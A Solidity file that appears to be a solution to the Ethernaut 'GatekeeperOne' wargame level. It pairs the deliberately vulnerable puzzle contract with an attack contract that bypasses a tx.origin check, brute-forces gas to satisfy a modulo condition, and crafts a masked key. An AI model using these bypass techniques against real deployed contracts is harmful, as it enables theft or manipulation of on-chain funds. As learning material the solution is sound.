// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '/contracts/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract GatekeeperOneHack {
    using SafeMath for uint256;
    GatekeeperOne ogContract = GatekeeperOne(/* your instance address */);
    address me = /* your metamask address */;
    
    // perform the bitwise operation on your bytes8 address
    bytes8 key = bytes8(uint64(me)) & 0xFFFFFFFF0000FFFF;
    uint count = 0;
        
    function attack() public {
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), key);

        // the call to the enter function will take up some amount of gas.
        // the second gate requires that the amount of gas left at that point be a multiple of 8191.
        // To make that happen, we increment gas amount until the condition is satisfied.
        for (uint256 i = 0; i < 300; i++) {
            (bool result,) = address(ogContract).call.gas(i + 150 + 8191 * 4)(encodedParams);
            
            if(result) {
                break;
            } else {
                count++;
            }
        }
    }
}